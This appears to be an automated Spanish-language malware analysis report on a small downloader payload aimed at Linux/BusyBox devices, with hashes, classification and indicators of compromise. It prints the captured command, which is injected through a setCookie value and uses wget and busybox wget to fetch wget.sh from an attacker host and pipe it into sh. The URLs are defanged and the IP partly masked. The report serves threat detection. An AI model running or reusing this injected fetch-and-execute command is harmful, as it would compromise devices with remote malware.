# 🧬 Payload Analysis

`402acb25980f110cc3da0210be97728fe151eff4d85396e78cc6a5ccabcf9e0a`

## 📌 Resumen

Texto ASCII de 170 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://91.92.40.XXX/wget.sh -O-`
2. `sh -s zyxsc`
3. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
4. `sh -s z` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/402acb25980f110cc3da0210be97728fe151eff4d85396e78cc6a5ccabcf9e0a.md](../../../../../malware-like/oraculo/downloader/402acb25980f110cc3da0210be97728fe151eff4d85396e78cc6a5ccabcf9e0a.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `402acb25980f110cc3da0210be97728fe151eff4d85396e78cc6a5ccabcf9e0a`
- **MD5:** `0f5a9e795a7d84f735a5fb7dc61f7086`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 170 B |
| Entropía | 4.78 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
setCookie=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s zyxsc;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s z
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | setCookie=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s zyxsc;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s z | strings |
| hash | 402acb25980f110cc3da0210be97728fe151eff4d85396e78cc6a5ccabcf9e0a | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
